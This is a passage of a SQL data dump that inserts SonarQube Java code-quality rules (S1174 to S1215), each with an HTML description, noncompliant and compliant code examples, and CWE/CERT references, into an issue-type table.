<h2>Exceptions</h2>
<p>The rule will not raise issues for unused parameters:</p>
<ul>
  <li> that are annotated with <code>@javax.enterprise.event.Observes</code> </li>
  <li> in overrides and implementation methods </li>
  <li> in interface <code>default</code> methods </li>
  <li> in non-private methods that only <code>throw</code> or that have empty bodies </li>
  <li> in annotated methods, unless the annotation is <code>@SuppressWarning("unchecked")</code> or <code>@SuppressWarning("rawtypes")</code>, in
  which case the annotation will be ignored </li>
  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the parameter is documented with a proper
  javadoc. </li>
</ul>
<pre>
@Override
void doSomething(int a, int b) {     // no issue reported on b
  compute(a);
}

public void foo(String s) {
  // designed to be extended but noop in standard case
}

protected void bar(String s) {
  //open-closed principle
}

public void qix(String s) {
  throw new UnsupportedOperationException("This method should be implemented in subclasses");
}

/**
 * @param s This string may be use for further computation in overriding classes
 */
protected void foobar(int a, String s) { // no issue, method is overridable and unused parameter has proper javadoc
  compute(a);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5dUxBQ">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1174', '"Object.finalize()" should remain protected (versus public) when overriding', 'sonarqube', 'Code Smell', '<p>The contract of the <code>Object.finalize()</code> method is clear: only the Garbage Collector is supposed to call this method.</p>
<p>Making this method public is misleading, because it implies that any caller can use it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  @Override
  public void finalize() {    // Noncompliant
    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/583.html">MITRE, CWE-583</a> - finalize() Method Declared Public </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/4jZGBQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1175', 'The signature of "finalize()" should match that of "Object.finalize()"', 'sonarqube', 'Bug', '<p><code>Object.finalize()</code> is called by the Garbage Collector at some point after the object becomes unreferenced.</p>
<p>In general, overloading <code>Object.finalize()</code> is a bad idea because:</p>
<ul>
  <li> The overload may not be called by the Garbage Collector. </li>
  <li> Users are not expected to call <code>Object.finalize()</code> and will get confused. </li>
</ul>
<p>But beyond that it''s a terrible idea to name a method "finalize" if it doesn''t actually override <code>Object.finalize()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int finalize(int someParameter) {        // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int someBetterName(int someParameter) {  // Compliant
  /* ... */
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1176', 'Public types, methods and fields (API) should be documented with Javadoc', 'sonarqube', 'Code Smell', '<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way
to understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>
<p>On top of a main description for each member of a public API, the following Javadoc elements are required to be described:</p>
<ul>
  <li> Parameters, using <code>@param parameterName</code>. </li>
  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>
  <li> Method return values, using <code>@return</code>. </li>
  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>
</ul>
<p>Furthermore the following guidelines should be followed:</p>
<ul>
  <li> At least 1 line of description. </li>
  <li> All parameters documented with <code>@param</code>, and names should match. </li>
  <li> All checked exceptions documented with <code>@throws</code> </li>
  <li> <code>@return</code> present and documented when not <code>void</code>. </li>
  <li> Placeholders like "TODO", "FIXME", "..." should be avoided. </li>
</ul>
<p>The following public methods and constructors are not taken into account by this rule:</p>
<ul>
  <li> Getters and setters. </li>
  <li> Methods overriding another method (usually decorated with <code>@Override</code>). </li>
  <li> Empty constructors. </li>
  <li> Static constants. </li>
</ul>
<p>For the parameters of the rule, the following rules are applied:</p>
<ul>
  <li> <code>?</code> matches a single character </li>
  <li> <code>*</code> matches zero or more characters </li>
  <li> <code>**</code> matches zero or more packages </li>
</ul>
<p>Examples:</p>
<ul>
  <li> <code>java.internal.InternalClass</code> will match only <code>InternalClass</code> class. </li>
  <li> <code>java.internal.*</code> will match any member of <code>java.internal</code> package. </li>
  <li> <code>java.internal.**</code> same as above, but including sub-packages. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
/**
  * This is a Javadoc comment
  */
public class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing ''@param &lt;T&gt;''

  public static final DEFAULT_STATUS = 0;    // Compliant - static constant
  private int status;                           // Compliant - not public

  public String message;                  // Noncompliant

  public MyClass() {                         // Noncompliant - missing documentation
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {  // Compliant - setter
    this.status = status;
  }

  @Override
  public void run() {                          // Compliant - has @Override annotation
  }

  protected void doSomething() {    // Compliant - not public
  }

  public void doSomething2(int value) {  // Noncompliant
  }

  public int doSomething3(int value) {  // Noncompliant
    return value;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
  * This is a Javadoc comment
  * @param &lt;T&gt; the parameter of the class
  */
public class MyClass&lt;T&gt; implements Runnable {

  public static final DEFAULT_STATUS = 0;
  private int status;

  /**
    * This is a Javadoc comment
    */
  public String message;

  /**
   * Class comment...
   */
  public MyClass() {
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {
    this.status = status;
  }

  @Override
  public void run() {
  }

  protected void doSomething() {
  }

  /**
    * Will do something.
    * @param value the value to be used
    */
  public void doSomething(int value) {

  /**
    *  {@inheritDoc}
    */
  public int doSomething(int value) {
    return value;
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S118', 'Abstract class names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
<code>abstract</code> class names match a provided regular expression. If a non-abstract class match the regular expression, an issue is raised to
suggest to either make it abstract or to rename it.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>^Abstract[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
abstract class MyClass { // Noncompliant
}

class AbstractLikeClass { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
abstract class AbstractClass {
}

class LikeClass {
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1181', 'Throwable and Error should not be caught', 'sonarqube', 'Code Smell', '<p><code>Throwable</code> is the superclass of all errors and exceptions in Java. <code>Error</code> is the superclass of all errors, which are not
meant to be caught by applications.</p>
<p>Catching either <code>Throwable</code> or <code>Error</code> will also catch <code>OutOfMemoryError</code> and <code>InternalError</code>, from
which an application should not attempt to recover.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try { /* ... */ } catch (Throwable t) { /* ... */ }
try { /* ... */ } catch (Error e) { /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
try { /* ... */ } catch (RuntimeException e) { /* ... */ }
try { /* ... */ } catch (MyException e) { /* ... */ }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>
  <li> <a href="https://github.com/isocpp/CppCoreGuidelines/blob/036324/CppCoreGuidelines.md#Re-exception-types">C++ Core Guidelines E.14</a> - Use
  purpose-designed user-defined types as exceptions (not built-in types) </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1182', 'Classes that override "clone" should be "Cloneable" and call "super.clone()"', 'sonarqube', 'Code Smell', '<p><code>Cloneable</code> is the marker <code>Interface</code> that indicates that <code>clone()</code> may be called on an object. Overriding
<code>clone()</code> without implementing <code>Cloneable</code> can be useful if you want to control how subclasses clone themselves, but otherwise,
it''s probably a mistake.</p>
<p>The usual convention for <code>Object.clone()</code> according to Oracle''s Javadoc is:</p>
<ol>
  <li> <code>x.clone() != x</code> </li>
  <li> <code>x.clone().getClass() == x.getClass()</code> </li>
  <li> <code>x.clone().equals(x)</code> </li>
</ol>
<p>Obtaining the object that will be returned by calling <code>super.clone()</code> helps to satisfy those invariants:</p>
<ol>
  <li> <code>super.clone()</code> returns a new object instance </li>
  <li> <code>super.clone()</code> returns an object of the same type as the one <code>clone()</code> was called on </li>
  <li> <code>Object.clone()</code> performs a shallow copy of the object''s state </li>
</ol>
<h2>Noncompliant Code Example</h2>
<pre>
class BaseClass {  // Noncompliant; should implement Cloneable
  @Override
  public Object clone() throws CloneNotSupportedException {    // Noncompliant; should return the super.clone() instance
    return new BaseClass();
  }
}

class DerivedClass extends BaseClass implements Cloneable {
  /* Does not override clone() */

  public void sayHello() {
    System.out.println("Hello, world!");
  }
}

class Application {
  public static void main(String[] args) throws Exception {
    DerivedClass instance = new DerivedClass();
    ((DerivedClass) instance.clone()).sayHello();              // Throws a ClassCastException because invariant #2 is violated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class BaseClass implements Cloneable {
  @Override
  public Object clone() throws CloneNotSupportedException {    // Compliant
    return super.clone();
  }
}

class DerivedClass extends BaseClass implements Cloneable {
  /* Does not override clone() */

  public void sayHello() {
    System.out.println("Hello, world!");
  }
}

class Application {
  public static void main(String[] args) throws Exception {
    DerivedClass instance = new DerivedClass();
    ((DerivedClass) instance.clone()).sayHello();              // Displays "Hello, world!" as expected. Invariant #2 is satisfied
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/580.html">MITRE, CWE-580</a> - clone() Method Without super.clone() </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/FjZGBQ">CERT, MET53-J.</a> - Ensure that the clone() method calls super.clone() </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1185', 'Overriding methods should do more than simply call the same method in the super class', 'sonarqube', 'Code Smell', '<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time
this is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such
overrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
  super.doSomething();
}

@Override
public boolean isLegal(Action action) {
  return super.isLegal(action);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public boolean isLegal(Action action) {         // Compliant - not simply forwarding the call
  return super.isLegal(new Action(/* ... */));
}

@Id
@Override
public int getId() {                            // Compliant - there is annotation different from @Override
  return super.getId();
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1186', 'Methods should not be empty', 'sonarqube', 'Code Smell', '<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an <code>UnsupportedOperationException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
}

public void doSomethingElse() {
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public void doSomething() {
  // Do nothing because of X and Y.
}

@Override
public void doSomethingElse() {
  throw new UnsupportedOperationException();
}
</pre>
<h2>Exceptions</h2>
<p>Default (no-argument) constructors are ignored when there are other constructors in the class, as are empty methods in abstract classes.</p>
<pre>
public abstract class Animal {
  void speak() {  // default implementation ignored
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1188', 'Anonymous classes should not have too many lines', 'sonarqube', 'Code Smell', '<p>Anonymous classes are a very convenient and compact way to inject a behavior without having to create a dedicated class. But those anonymous inner
classes should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly become
unreadable.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S119', 'Type parameter names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions make it possible for a team to collaborate efficiently. Following the established convention of single-letter type
parameter names helps users and maintainers of your code quickly see the difference between a type parameter and a poorly named class.</p>
<p>This rule check that all type parameter names match a provided regular expression. The following code snippets use the default regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass&lt;TYPE&gt; { // Noncompliant
  &lt;TYPE&gt; void method(TYPE t) { // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass&lt;T&gt; {
  &lt;T&gt; void method(T t) {
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1190', 'Future keywords should not be used as names', 'sonarqube', 'Code Smell', '<p>Through Java''s evolution keywords have been added. While code that uses those words as identifiers may be compilable under older versions of Java,
it will not be under modern versions. </p>
<p>Following keywords are marked as invalid identifiers </p>
<table>
  <tbody>
    <tr>
      <th>Keyword</th>
      <th>Added</th>
    </tr>
    <tr>
      <td><code>_</code></td>
      <td>9</td>
    </tr>
    <tr>
      <td><code>enum</code></td>
      <td>5.0</td>
    </tr>
  </tbody>
</table>
<p><code>assert</code> and <code>strictfp</code> are another example of valid identifiers which became keywords in later versions, but are not
supported by this rule.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
  int enum = 42;            // Noncompliant
  String _ = "";   // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething() {
  int magic = 42;
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1191', 'Classes from "sun.*" packages should not be used', 'sonarqube', 'Code Smell', '<p>Classes in the <code>sun.*</code> or <code>com.sun.*</code> packages are considered implementation details, and are not part of the Java API.</p>
<p>They can cause problems when moving to new versions of Java because there is no backwards compatibility guarantee. Similarly, they can cause
problems when moving to a different Java vendor, such as OpenJDK.</p>
<p>Such classes are almost always wrapped by Java API classes that should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import com.sun.jna.Native;     // Noncompliant
import sun.misc.BASE64Encoder; // Noncompliant
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1192', 'String literals should not be duplicated', 'sonarqube', 'Code Smell', '<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
public void run() {
  prepare("action1");                              // Noncompliant - "action1" is duplicated 3 times
  execute("action1");
  release("action1");
}

@SuppressWarning("all")                            // Compliant - annotations are excluded
private void method1() { /* ... */ }
@SuppressWarning("all")
private void method2() { /* ... */ }

public String method3(String a) {
  System.out.println("''" + a + "''");               // Compliant - literal "''" has less than 5 characters and is excluded
  return "";                                       // Compliant - literal "" has less than 5 characters and is excluded
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final String ACTION_1 = "action1";  // Compliant

public void run() {
  prepare(ACTION_1);                               // Compliant
  execute(ACTION_1);
  release(ACTION_1);
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1193', 'Exception types should not be tested using "instanceof" in catch blocks', 'sonarqube', 'Code Smell', '<p>Multiple catch blocks of the appropriate type should be used instead of catching a general exception, and then testing on the type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  if(e instanceof IOException) { /* ... */ }         // Noncompliant
  if(e instanceof NullPointerException{ /* ... */ }  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (IOException e) { /* ... */ }                // Compliant
} catch (NullPointerException e) { /* ... */ }       // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/ERR51-J.+Prefer+user-defined+exceptions+over+more+general+exception+types">CERT,
  ERR51-J.</a> - Prefer user-defined exceptions over more general exception types </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1194', '"java.lang.Error" should not be extended', 'sonarqube', 'Code Smell', '<p><code>java.lang.Error</code> and its subclasses represent abnormal conditions, such as <code>OutOfMemoryError</code>, which should only be
encountered by the Java Virtual Machine.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyException extends Error { /* ... */ }       // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyException extends Exception { /* ... */ }   // Compliant
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1195', 'Array designators "[]" should be located after the type in method signatures', 'sonarqube', 'Code Smell', '<p>According to the Java Language Specification: </p>
<blockquote>
  <p>For compatibility with older versions of the Java SE platform,</p>
  <p>the declaration of a method that returns an array is allowed to place (some or all of) the empty bracket pairs that form the declaration of the
  array type after the formal parameter list.</p>
  <p>This obsolescent syntax should not be used in new code.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public int getVector()[] { /* ... */ }    // Noncompliant

public int[] getMatrix()[] { /* ... */ }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public int[] getVector() { /* ... */ }

public int[][] getMatrix() { /* ... */ }
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1197', 'Array designators "[]" should be on the type, not the variable', 'sonarqube', 'Code Smell', '<p>Array designators should always be located on the type for better code readability. Otherwise, developers must look both at the type and the
variable name to know whether or not a variable is an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int matrix[][];   // Noncompliant
int[] matrix[];   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int[][] matrix;   // Compliant
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1199', 'Nested code blocks should not be used', 'sonarqube', 'Code Smell', '<p>Nested code blocks can be used to create a new scope and restrict the visibility of the variables defined inside it. Using this feature in a method
typically indicates that the method has too many responsibilities, and should be refactored into smaller methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void evaluate(int operator) {
  // Do some computation...
  {
    int a = stack.pop();
    int b = stack.pop();
    int result = a + b;
    stack.push(result);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void evaluate(int operator) {
  // Do some computation...
  evaluateAdd();
}

private void evaluateAdd() {
  int a = stack.pop();
  int b = stack.pop();
  int result = a + b;
  stack.push(result);
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S120', 'Package names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all package names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z_]+(.[a-z_][a-z0-9_]*)*$</code>:</p>
<pre>
package org.exAmple; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.example;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1200', 'Classes should not be coupled to too many other classes (Single Responsibility Principle)', 'sonarqube', 'Code Smell', '<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book "Principles of Object Oriented Design", a class should
have only one responsibility:</p>
<blockquote>
  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>
  <p>Changes to one responsibility may impair or inhibit the class'' ability to meet the others.</p>
  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>
</blockquote>
<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>
<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 5:</p>
<pre>
class Foo {                        // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7
  T1 a1;                           // Foo is coupled to T1
  T2 a2;                           // Foo is coupled to T2
  T3 a3;                           // Foo is coupled to T3

  public T4 compute(T5 a, T6 b) {  // Foo is coupled to T4, T5 and T6
    T7 result = a.getResult(b);    // Foo is coupled to T7
    return result;
  }

  public static class Bar {        // Compliant - Bar depends on 2 classes: T8 and T9
    T8 a8;
    T9 a9;
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1201', '"equals" method overrides should accept "Object" parameters', 'sonarqube', 'Bug', '<p>"equals" as a method name should be used exclusively to override <code>Object.equals(Object)</code> to prevent any confusion.</p>
<p>It is tempting to overload the method to take a specific class instead of <code>Object</code> as parameter, to save the class comparison check.
However, this will not work as expected when that is the only override.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private int foo = 1;

  public boolean equals(MyClass o) {  // Noncompliant; does not override Object.equals(Object)
    return o != null &amp;&amp; o.foo == this.foo;
  }

  public static void main(String[] args) {
    MyClass o1 = new MyClass();
    Object o2 = new MyClass();
    System.out.println(o1.equals(o2));  // Prints "false" because o2 an Object not a MyClass
  }
}

class MyClass2 {
  public boolean equals(MyClass2 o) {  // Ignored; `boolean equals(Object)` also present
    //..
  }

  public boolean equals(Object o) {
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  private int foo = 1;

  @Override
  public boolean equals(Object o) {
    if (this == o) {
        return true;
    }
    if (o == null || getClass() != o.getClass()) {
      return false;
    }

    MyClass other = (MyClass)o;
    return this.foo == other.foo;
  }

  /* ... */
}

class MyClass2 {
  public boolean equals(MyClass2 o) {
    //..
  }

  public boolean equals(Object o) {
    //...
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1206', '"equals(Object obj)" and "hashCode()" should be overridden in pairs', 'sonarqube', 'Bug', '<p>According to the Java Language Specification, there is a contract between <code>equals(Object)</code> and <code>hashCode()</code>:</p>
<blockquote>
  <p>If two objects are equal according to the <code>equals(Object)</code> method, then calling the <code>hashCode</code> method on each of the two
  objects must produce the same integer result. </p>
  <p>It is not required that if two objects are unequal according to the <code>equals(java.lang.Object)</code> method, then calling the
  <code>hashCode</code> method on each of the two objects must produce distinct integer results.</p>
  <p>However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of
  hashtables.</p>
</blockquote>
<p>In order to comply with this contract, those methods should be either both inherited, or both overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {    // Noncompliant - should also override "hashCode()"

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {    // Compliant

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

  @Override
  public int hashCode() {
    /* ... */
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/581.html">MITRE, CWE-581</a> - Object Model Violation: Just One of Equals and Hashcode Defined
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/7DVGBQ">CERT, MET09-J.</a> - Classes that define an equals() method must also define a
  hashCode() method </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S121', 'Control structures should use curly braces', 'sonarqube', 'Code Smell', '<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When the body of an <code>if</code> statement is a single <code>return</code>, <code>break</code> or <code>continue</code> and is on the same
line.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/g9YxBQ">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/MzZGBQ">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1210', '"equals(Object obj)" should be overridden along with the "compareTo(T obj)" method', 'sonarqube', 'Code Smell', '<p>According to the Java <code>Comparable.compareTo(T o)</code> documentation:</p>
<blockquote>
  <p>It is strongly recommended, but not strictly required that <code>(x.compareTo(y)==0) == (x.equals(y))</code>.</p>
  <p>Generally speaking, any class that implements the Comparable interface and violates this condition should clearly indicate this fact.</p>
  <p>The recommended language is "Note: this class has a natural ordering that is inconsistent with equals." </p>
</blockquote>
<p>If this rule is violated, weird and unpredictable failures can occur.</p>
<p>For example, in Java 5 the <code>PriorityQueue.remove()</code> method relied on <code>compareTo()</code>, but since Java 6 it has relied on
<code>equals()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Comparable&lt;Foo&gt; {
  @Override
  public int compareTo(Foo foo) { /* ... */ }      // Noncompliant as the equals(Object obj) method is not overridden
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements Comparable&lt;Foo&gt; {
  @Override
  public int compareTo(Foo foo) { /* ... */ }      // Compliant

  @Override
  public boolean equals(Object obj) { /* ... */ }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1213', 'The members of an interface or class declaration should appear in a pre-defined order', 'sonarqube', 'Code Smell', '<p>According to the Java Code Conventions as defined by Oracle, the members of a class or interface declaration should appear in the following order
in the source files:</p>
<ul>
  <li> Class variables </li>
  <li> Instance variables </li>
  <li> Constructors </li>
  <li> Methods </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo{
   private int field = 0;
   public boolean isTrue() {...}
   public Foo() {...}                         // Noncompliant, constructor defined after methods
   public static final int OPEN = 4;  //Noncompliant, variable defined after constructors and methods
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo{
   public static final int OPEN = 4;
   private int field = 0;
   public Foo() {...}
   public boolean isTrue() {...}
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1214', 'Constants should not be defined in interfaces', 'sonarqube', 'Code Smell', '<p>According to Joshua Bloch, author of "Effective Java":</p>
<blockquote>
  <p>The constant interface pattern is a poor use of interfaces. </p>
  <p>That a class uses some constants internally is an implementation detail.</p>
  <p>Implementing a constant interface causes this implementation detail to leak into the class''s exported API. It is of no consequence to the users
  of a class that the class implements a constant interface. In fact, it may even confuse them. Worse, it represents a commitment: if in a future
  release the class is modified so that it no longer needs to use the constants, it still must implement the interface to ensure binary compatibility.
  If a nonfinal class implements a constant interface,</p>
  <p>all of its subclasses will have their namespaces polluted by the constants in the interface.</p>
</blockquote>
<p>This rule raises an issue when an interface consists solely of fields, without any other members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface Status {                      // Noncompliant
   int OPEN = 1;
   int CLOSED = 2;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public enum Status {                    // Compliant
  OPEN,
  CLOSED;
}
</pre>
<p>or</p>
<pre>
public final class Status {             // Compliant
   public static final int OPEN = 1;
   public static final int CLOSED = 2;
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1215', 'Execution of the Garbage Collector should be triggered only by the JVM', 'sonarqube', 'Code Smell', '<p>Calling <code>System.gc()</code> or <code>Runtime.getRuntime().gc()</code> is a bad idea for a simple reason: there is no way to know exactly what
will be done under the hood by the JVM because the behavior will depend on its vendor, version and options:</p>
<ul>
  <li> Will the whole application be frozen during the call? </li>
  <li> Is the <code>-XX:DisableExplicitGC</code> option activated? </li>
  <li> Will the JVM simply ignore the call? </li>
